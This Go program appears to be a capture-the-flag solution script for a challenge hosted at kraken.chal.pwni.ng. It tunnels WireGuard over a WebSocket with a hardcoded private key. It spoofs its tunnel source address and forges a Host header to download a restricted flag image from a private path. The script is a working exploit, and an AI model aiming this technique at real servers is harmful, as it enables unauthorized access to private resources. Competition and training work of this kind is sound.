package main

import (
	"context"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/netip"
	"os"
	"strings"
	"time"

	"golang.zx2c4.com/wireguard/conn"
	"golang.zx2c4.com/wireguard/device"
	"golang.zx2c4.com/wireguard/tun/netstack"
	"golang.zx2c4.com/wireguard/wgctrl/wgtypes"
	"nhooyr.io/websocket"
)

type WSEndpoint struct {
	src netip.Addr
	dst netip.Addr
}

func NewWSEndpoint(src netip.Addr, dst netip.Addr) *WSEndpoint {
	return &WSEndpoint{
		src: src,
		dst: dst,
	}
}

func (e WSEndpoint) ClearSrc()           {}
func (e WSEndpoint) SrcToString() string { return e.src.String() }
func (e WSEndpoint) DstToString() string { return e.dst.String() }
func (e WSEndpoint) DstToBytes() []byte  { return e.dst.AsSlice() }
func (e WSEndpoint) DstIP() netip.Addr   { return e.dst }
func (e WSEndpoint) SrcIP() netip.Addr   { return e.src }

type WSBind struct {
	ctx    context.Context
	c      *websocket.Conn
	closed bool
	ep     conn.Endpoint
}

func NewWSBind(c *websocket.Conn, ep conn.Endpoint) *WSBind {
	return &WSBind{
		ctx:    context.Background(),
		c:      c,
		closed: false,
		ep:     ep,
	}
}

func (b WSBind) Open(port uint16) ([]conn.ReceiveFunc, uint16, error) {
	var fns []conn.ReceiveFunc
	if b.closed {
		return nil, 0, net.ErrClosed
	}

	fn := func(packets [][]byte, sizes []int, eps []conn.Endpoint) (n int, err error) {
		// log.Println("Called read func")
		typ, buf, err := b.c.Read(b.ctx)
		// log.Println(buf)
		if err != nil {
			log.Panic(err)
			return 0, err
		}

		if typ != websocket.MessageBinary {
			log.Panic("WS Message wasn't binary")
			return 0, websocket.CloseError{}
		}

		sizes[0] = len(buf)
		copy(packets[0], buf)
		eps[0] = b.ep

		return 1, nil
	}

	fns = append(fns, fn)

	// log.Printf("Open(%d)\n", port)
	return fns, 1, nil
}

func (b WSBind) Close() error {
	b.closed = true
	// log.Printf("Close()\n")
	return nil
}

func (b WSBind) SetMark(mark uint32) error {
	// log.Printf("SetMark()\n")
	return nil
}

func (b WSBind) Send(bufs [][]byte, ep conn.Endpoint) error {
	// log.Printf("Send(buf, %s)\n", ep)
	for i := range bufs {
		b.c.Write(b.ctx, websocket.MessageBinary, bufs[i])
	}
	return nil
}

func (b WSBind) ParseEndpoint(s string) (conn.Endpoint, error) {
	// log.Printf("ParseEndpoint(%s)\n", s)
	return b.ep, nil
}

func (b WSBind) BatchSize() int {
	// log.Printf("BatchSize()\n")
	return 1
}

func B64ToHex(inp string) string {
	p, err := base64.StdEncoding.DecodeString(inp)
	if err != nil {
		log.Panic(err)
	}
	return hex.EncodeToString(p)
}

func main() {
	fmt.Println("Starting")

	serverPubKey := "kraKENyGAX30e06miiNHxAzFNHIKxunMdUCZnjPhTCU="
	serverPubKeyHex := B64ToHex(serverPubKey)

	// privKey, err := wgtypes.GeneratePrivateKey()
	privKey, err := wgtypes.ParseKey("mHhIF3LvO/VP1TmeqMXQIte+2DN5eJwc7EerJqTbfVk=")
	if err != nil {
		log.Panic(err)
	}
	log.Println(privKey)
	privKeyHex := B64ToHex(privKey.String())
	pubKey := privKey.PublicKey()
	pubKeyStr := strings.Replace(pubKey.String(), "=", "", -1)

	serverAddr := netip.MustParseAddr("::")
	// ourAddr := netip.MustParseAddr("::ffff:127.0.0.1")
	ourAddr := netip.MustParseAddr("::ffff:192.0.0.1")

	wsEndpointUrl := fmt.Sprintf("ws://kraken.chal.pwni.ng/ws?pub=%s&addr=%s", pubKeyStr, ourAddr.String())

	fmt.Println(wsEndpointUrl)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second*10)
	defer cancel()

	c, _, err := websocket.Dial(ctx, wsEndpointUrl, nil)
	if err != nil {
		log.Panic(err)
	}

	ep := NewWSEndpoint(ourAddr, serverAddr)
	bind := NewWSBind(c, ep)

	tun, tnet, err := netstack.CreateNetTUN(
		[]netip.Addr{ourAddr},
		[]netip.Addr{},
		1420,
	)

	if err != nil {
		log.Panic(err)
	}

	devLogger := device.NewLogger(device.LogLevelError, "WG")

	dev := device.NewDevice(tun, bind, devLogger)
	conf_str := fmt.Sprintf("private_key=%s\npublic_key=%s\nendpoint=[%s]:%d\nallowed_ip=::/0\n", privKeyHex, serverPubKeyHex, serverAddr.String(), 1234)
	dev.IpcSet(conf_str)
	dev.Up()

	client := http.Client{
		Transport: &http.Transport{
			DialContext: tnet.DialContext,
		},
	}

	req, err := http.NewRequest("GET", "http://[dead:beef::5a11:b0a7]/private/Flag/flag.jpg", nil)
	if err != nil {
		log.Panic(err)
	}

	req.Host = "domain.tld"
	resp, err := client.Do(req)
	if err != nil {
		log.Panic(err)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Panic(err)
	}

	f, err := os.Create("Flag.jpg")
	f.Write(body)
	f.Close()

	dev.Close()
}
